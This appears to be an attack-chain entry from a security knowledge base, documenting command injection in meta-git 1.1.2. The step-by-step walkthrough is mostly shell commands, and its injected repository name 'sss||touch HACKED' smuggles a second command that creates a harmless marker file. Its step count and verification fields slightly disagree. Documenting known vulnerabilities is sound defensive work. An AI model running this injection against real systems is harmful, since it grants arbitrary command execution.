---
id: c08bf938-1faa-40cd-898a-3501118f07e2
name: RCE in meta-git via Malicious Repository Name Shell Injection
type: attack_chain
description: >-
  Demonstrates remote code execution in the meta-git Node.js module by injecting
  shell commands through an unsanitized repository name in the git clone
  operation.
verified: false
submitted: true
step_count: 4
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:20.230Z'
procedures:
  - '[[procedures/Setup-Test-Environment-for-meta-git-Exploitation]]'
  - '[[procedures/Verify-No-HACKED-File]]'
  - '[[procedures/Install-Vulnerable-meta-git-Module]]'
  - '[[procedures/Exploit-RCE-in-meta-git-Clone]]'
  - '[[procedures/Verify-RCE-Exploitation-Success]]'
techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Client Execution]]'
tactics:
  - '[[Execution]]'
tags:
  - rce
  - command-injection
  - node-js
  - npm
  - git
  - shell-injection
platforms:
  - Linux
  - Node.js
tools:
  - '[[tools/npm]]'
  - '[[tools/meta-git]]'
  - '[[tools/touch]]'
  - '[[tools/mkdir]]'
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Client Execution]]'
---

# RCE in meta-git via Malicious Repository Name Shell Injection

Multi-stage attack chain demonstrating a complete attack workflow exploiting a command injection vulnerability in the meta-git Node.js module version 1.1.2. The vulnerability arises from directly interpolating user-provided repository names into shell commands without sanitization, allowing attackers to execute arbitrary commands like creating files or compromising the system.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Environment] --> B[Install Vulnerable Module]
    B --> C[Exploit RCE via Clone]
    C --> D[Verify Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/meta-git]]
- [[tools/touch]]
- [[tools/mkdir]]

### Target Environment

- Target OS/Platform: Linux with Node.js installed
- Required services/ports: None specific, local execution
- Network access requirements: Internet for npm install and git operations

### Initial Access Requirements

- Credential requirements: None, assumes local or remote access to a Node.js environment
- Network position: Local machine or server with npm access
- Prior access needed: Ability to run npm commands

## Detailed Attack Procedures

### Step 1: Setup Test Environment
procedure: [[procedures/Setup-Test-Environment-for-meta-git-Exploitation]]

**Objective**: Create a controlled test directory and initial files to simulate a safe exploitation environment.

**Instructions**: Use [[commands/create-tests-directory]] to make the tests folder:

```bash
mkdir tests
```

Then navigate into it with [[commands/navigate-to-tests]]:

```bash
cd tests
```

Create initial files using [[commands/create-test-file]] for 'test':

```bash
touch test
```

For 'secret':

```bash
touch secret
```

And for 'files':

```bash
touch files
```

**Expected Output**: Directory 'tests' created with empty files 'test', 'secret', and 'files'.

**Success Indicators**:
- Directory 'tests' exists
- Initial files are present

### Step 2: Verify No HACKED File Exists
procedure: [[procedures/Verify-No-HACKED-File]]

**Objective**: Confirm the target indicator file does not exist before exploitation to validate success later.

**Instructions**: Manually check directory contents using ls or similar; no specific command executed in extraction, but ensure 'HACKED' is absent.

**Expected Output**: No 'HACKED' file listed in directory.

**Success Indicators**:
- 'HACKED' file not present

### Step 3: Install Vulnerable meta-git Module
procedure: [[procedures/Install-Vulnerable-meta-git-Module]]

**Objective**: Install the vulnerable version of meta-git globally to enable the clone command exploitation.

**Instructions**: Use [[commands/install-meta-git-global]] via npm:

```bash
npm i meta-git -g
```

**Expected Output**: meta-git@1.1.2 installed globally.

**Success Indicators**:
- meta-git command available
- Version 1.1.2 confirmed

### Step 4: Exploit RCE via Clone Command
procedure: [[procedures/Exploit-RCE-in-meta-git-Clone]]

**Objective**: Inject a malicious repository name to execute arbitrary shell commands, creating the 'HACKED' file.

**Instructions**: Run the clone with malicious input using [[commands/meta-git-clone-malicious]]:

```bash
meta-git clone 'sss||touch HACKED'
```

The '||touch HACKED' injects the command after the failed clone attempt.

**Expected Output**: Clone may fail, but 'HACKED' file created due to injection.

**Success Indicators**:
- Arbitrary command executed
- File 'HACKED' appears

### Step 5: Verify Exploitation Success
procedure: [[procedures/Verify-RCE-Exploitation-Success]]

**Objective**: Confirm the RCE by checking for the created 'HACKED' file.

**Instructions**: Recheck directory contents; use ls to list files and verify 'HACKED' exists.

**Expected Output**: 'HACKED' file present in the directory.

**Success Indicators**:
- 'HACKED' file created
- Demonstrates full RCE

## Attack Chain Summary

### Key Achievements

1. Established a clean test environment
2. Installed and exploited vulnerable meta-git module
3. Achieved arbitrary command execution via shell injection
4. Verified system compromise with file creation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Unix Shell]]
- [[Exploitation for Client Execution]]

### MITRE ATT&CK Tactics

- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
